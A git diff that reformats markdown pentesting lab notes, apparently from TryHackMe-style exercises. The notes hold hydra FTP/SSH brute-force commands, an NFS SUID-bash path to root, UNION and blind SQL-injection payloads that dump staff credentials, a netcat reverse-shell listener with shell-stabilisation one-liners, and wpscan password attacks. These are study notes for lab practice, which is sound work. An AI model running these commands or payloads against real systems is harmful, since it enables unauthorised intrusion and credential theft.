@@ -375,8 +375,10 @@ Hydra is a very fast online password cracking tool, which can perform rapid dict
 
 
 The syntax for the command we're going to use to find the passwords is this:
-"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
+`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
+
 Let's break it down:
+
 SECTION         	FUNCTION
 
 hydra               	Runs the hydra tool
@@ -411,12 +413,13 @@ hmm
 
 # NFS
 
-NFS-Common
+### NFS-Common
+
 It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with "showmount" and "mount.nfs"
 
-use /usr/sbin/showmount -e [IP] to list the NFS shares
+`use /usr/sbin/showmount -e [IP] to list the NFS shares`
 
-sudo mount -t nfs IP:share /tmp/mount/ -nolock
+`sudo mount -t nfs IP:share /tmp/mount/ -nolock`
 
 Path:
     NFS Access ->
@@ -427,11 +430,12 @@ Path:
                 	    Execute SUID Bit Bash Executable ->
                     	    ROOT ACCESS
 
-# Enumerating NFS
+### Enumerating NFS
 
 ![[Images/image6.png]]
 ![[Images/image24.png]]
 ![[Images/image1.png]]
+```sh
 PORT  	STATE SERVICE  REASON  VERSION
 22/tcp	open  ssh  	syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -453,6 +457,7 @@ PORT  	STATE SERVICE  REASON  VERSION
 40205/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
 40841/tcp open  mountd   syn-ack 1-3 (RPC #100005)
 52885/tcp open  mountd   syn-ack 1-3 (RPC #100005)
+```
 
 ![[Images/image38.png]]
 ![[Images/image42.png]]
@@ -465,7 +470,7 @@ PORT  	STATE SERVICE  REASON  VERSION
 ![[Images/image31.png]]
 ![[Images/image67.png]]
 
-# Exploiting NFS
+### Exploiting NFS
 
 wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
 ![[Images/image12.png]]
@@ -488,7 +493,7 @@ wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkt
 
 sudo apt install seclists
 
-hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.223.172 ssh
+`hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.223.172 ssh`
 
 ![[Images/image66.png]]
 ![[Images/image11.png]]
@@ -517,8 +522,8 @@ hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.223.172 ss
 
 # MySQL
 
-sudo apt install default-mysql-client
-mysql -h [IP] -u [username] -p
+`sudo apt install default-mysql-client`
+`mysql -h [IP] -u [username] -p`
 
 ![[Images/image4.png]]
 ![[Images/image22.png]]
@@ -563,22 +568,22 @@ sqli_one
 by setting the id to an illegal number we make sure that our query’s reply is the only correct one and the one that is shown.
 
 get tables:
-0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`
 group_concat() = makes string from table?
 information_schema database every user has access to, information about all the databases and tables the user has access to
 here we’re asking about tables in the sqli_one database
 
 get columns:
-0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
 
 We get id, username, password
 
 
 (other uglier way to do this from burp room:
-/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people")
+`/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people")`
 
 get data:
-0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
 
 We get:
 `admin:p4ssword`
@@ -595,7 +600,7 @@ makes the query
 select * from users where username='' and password='' OR 1=1;
 which is always true = bypassing login
 
-Blind Boolean
+#### Blind Boolean
 
 https://website.thm/checkuser?username=admin
 true
@@ -655,7 +660,7 @@ admin123' UNION SELECT 1,2,3 from users where username='admin' and password like
 password is 3845
 
 
-Blind time based SQLi
+#### Blind time based SQLi
 
 Uses sleep to see true/false
 
@@ -721,7 +726,7 @@ adding it to data sent to the web page intercepting with burp proxy, the example
 first go to the new url, then refresh the page
 
 
-Shells & Reverse shells
+# Shells & Reverse shells
 
 netcat, can receive rev shells
 socat, better netcat
@@ -737,7 +742,7 @@ On the attacking machine: `nc MACHINE_IP <port>`
 thm alias listener =
 sudo rlwrap nc -lvnp 443
 
-Stabilizing the shell
+### Stabilizing the shell
 
 python -c 'import pty;pty.spawn("/bin/bash")'
 perl -e 'exec "/bin/bash";'
@@ -792,7 +797,7 @@ If there’s no key, generate one with ssh-keygen.
 
 
 
-Gobuster
+# Gobuster
 
 -t 64	64 threads to speed up
 gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -819,7 +824,7 @@ good wordlists for this purpose:
 	/usr/share/wordlists/dirb/extensions_common.txt - Useful for when fuzzing for files!
 
 
-wpscan
+# wpscan
 
 wpscan --url http://cmnatics.playground/ --enumerate t
 wpscan --url http://cmnatics.playground/ --enumerate p
@@ -833,7 +838,7 @@ wpscan --url http://wpscan.thm/ --passwords /usr/share//wordlists/rockyou.txt --
 --plugins-detection aggressive
 --plugins-detection passive
 
-nikto
+# nikto
 
 nikto -h 10.10.186.192:80
 
@@ -849,7 +854,7 @@ nikto -h 10.10.186.192:80 -Plugin dir_traversal
 
 
 
-Privesc Linux
+# Privesc Linux
 
 LinEnum.sh
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
@@ -883,7 +888,7 @@ cat /etc/crontab
 
 
 
-AD
+# AD
 
 shadow creds,  logging in with cert + priv key
 
@@ -969,4 +974,4 @@ Windows
 
 another trick is with programs is in the taskbar. Sometimes they are running with admin rights, then you open the help of the program then you can open an explorer.exe windows then launch cmd.exe with admin rights
 
-C:\Users\Jacob\AppData\Local\Microsoft\Teams\Update.exe
+`C:\Users\Jacob\AppData\Local\Microsoft\Teams\Update.exe`
